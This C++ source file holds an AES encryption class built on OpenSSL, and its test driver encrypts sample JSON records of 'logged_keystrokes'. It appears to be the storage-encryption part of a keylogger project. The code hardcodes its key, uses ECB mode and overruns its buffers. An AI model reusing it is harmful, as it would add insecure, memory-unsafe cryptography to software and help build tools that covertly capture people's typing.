#include <iostream>
#include <cstring>
#include <stdio.h>
#include <openssl/aes.h>

using namespace std;

static const unsigned char key[] = "4nA^9yFLjQpxC79t9J6kYlwsDf4AZqA%";

class EncryptionManager {
    public:
        void encrypt(string, unsigned char*, int);
        string decrypt(unsigned char*, int);
};


void EncryptionManager::encrypt(string plaintext, unsigned char* ciphertext, int len) {

    // number of splits we need to make (16 byte blocks)
    int iterations = ((len)/16)+1;

    // arrays to handle the input/output to the encrypt
    unsigned char enc_out[16];
    unsigned char enc_in[16];

    AES_KEY enc_key;
    AES_set_encrypt_key(key, 256, &enc_key);

    for (int i = 0; i <= iterations; i++){
        for (int j = 0; j < 16; j++)
            enc_in[j]=plaintext[(i*16)+j];

        AES_encrypt(enc_in, enc_out, &enc_key);

        for (int j = 0; j < 16; j++)
            ciphertext[(i*16)+j]=enc_out[j];
    }
}

string EncryptionManager::decrypt(unsigned char* ciphertext, int len) {

    // number of splits we need to make (16 byte blocks)
    int iterations = ((len)/16)+1;

    // arrays to handle the input/output to the decrypt
    unsigned char dec_out[16];
    unsigned char dec_in[16];

    // a nicer array to be converted to a string later
    unsigned char result[iterations*16];

    AES_KEY dec_key;
    AES_set_decrypt_key(key,256,&dec_key);

    for (int i = 0; i <= iterations; i++){

        for (int j = 0; j < 16; j++)
            dec_in[j]=ciphertext[(i*16)+j];

        AES_decrypt(dec_in, dec_out, &dec_key);

        for (int j = 0; j < 16; j++){
            if ((i*16)+j >= len)
                result[(i*16)+j] = 0;
            else
                result[(i*16)+j]=dec_out[j];
        }
    }

    return string((const char*)result);
}

// test driver
int main()
{
    string plaintext = "{\n\t\"active_process\": \"chrome\",\n\t\"process_id\": \"2476\",\n\t\"start_time\": \"03/31/2017-00:06:43\",\n\t\"end_time\": \"03/31/2017-00:12:23\",\n\t\"session_duration\": \"340\",\n\t\"logged_keystrokes\": \"This is a sample of wh@t the keylogg3r will be l0gging.\"\n}{\n\t\"active_process\": \"chrome\",\n\t\"process_id\": \"2476\",\n\t\"start_time\": \"03/31/2017-00:06:43\",\n\t\"end_time\": \"03/31/2017-00:12:23\",\n\t\"session_duration\": \"340\",\n\t\"logged_keystrokes\": \"This is a sample of wh@t the keylogg3r will be l0gging.\"\n}{\n\t\"active_process\": \"chrome\",\n\t\"process_id\": \"2476\",\n\t\"start_time\": \"03/31/2017-00:06:43\",\n\t\"end_time\": \"03/31/2017-00:12:23\",\n\t\"session_duration\": \"340\",\n\t\"logged_keystrokes\": \"This is a sample of wh@t the keylogg3r will be l0gging.\"\n}{\n\t\"active_process\": \"chrome\",\n\t\"process_id\": \"2476\",\n\t\"start_time\": \"03/31/2017-00:06:43\",\n\t\"end_time\": \"03/31/2017-00:12:23\",\n\t\"session_duration\": \"340\",\n\t\"logged_keystrokes\": \"This is a sample of wh@t the keylogg3r will be l0gging.\"\n}{\n\t\"active_process\": \"chrome\",\n\t\"process_id\": \"2476\",\n\t\"start_time\": \"03/31/2017-00:06:43\",\n\t\"end_time\": \"03/31/2017-00:12:23\",\n\t\"session_duration\": \"340\",\n\t\"logged_keystrokes\": \"This is a sample of wh@t the keylogg3r will be l0gging.\"\n}";

    EncryptionManager em;
    int len = plaintext.length();
    unsigned char ciphertext[len];
    em.encrypt(plaintext, ciphertext, len);
    string decrypted = em.decrypt(ciphertext, len);
    cout << "PLAINTEXT: \n\n" << plaintext << "\n\n\n";
    cout << "ENCRYPTED: \n\n" << ciphertext << "\n\n\n";
    cout << "DECRYPTED: " << decrypted << "\n\n\n";

    return 0;
}

